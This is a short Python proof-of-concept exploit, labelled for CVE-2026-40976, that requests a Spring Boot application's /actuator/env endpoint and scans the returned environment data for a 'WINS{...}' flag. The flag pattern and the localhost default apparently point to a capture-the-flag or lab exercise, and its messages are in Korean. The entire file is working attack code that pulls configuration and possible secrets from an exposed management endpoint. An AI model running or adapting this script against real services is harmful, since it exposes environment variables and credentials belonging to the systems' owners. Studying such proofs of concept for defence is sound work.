#!/usr/bin/env python3
import sys, re, argparse, requests

def exploit(base_url, timeout):
    base = base_url.rstrip("/")
    env_url = base + "/actuator/env"
    print(f"[*] Target : {env_url}")
    try:
        resp = requests.get(env_url, timeout=timeout)
    except requests.exceptions.RequestException as e:
        print(f"[!] 요청 실패: {e}")
        return 1
    print(f"[*] Status : {resp.status_code}")

    # env 응답(JSON) 전체에서 플래그 패턴 탐색
    m = re.search(r"WINS\{[^}]+\}", resp.text)
    if m:
        print(f"[+] FLAG   : {m.group(0)}")
        return 0
    print(f"[!] 플래그 미발견. 응답 일부:\n{resp.text[:500]}")
    return 1

def main():
    p = argparse.ArgumentParser(description="CVE-2026-40976 env-leak PoC")
    p.add_argument("-u", "--url", default="http://localhost:10018")
    p.add_argument("-t", "--timeout", type=float, default=10.0)
    args = p.parse_args()
    sys.exit(exploit(args.url, args.timeout))

if __name__ == "__main__":
    main()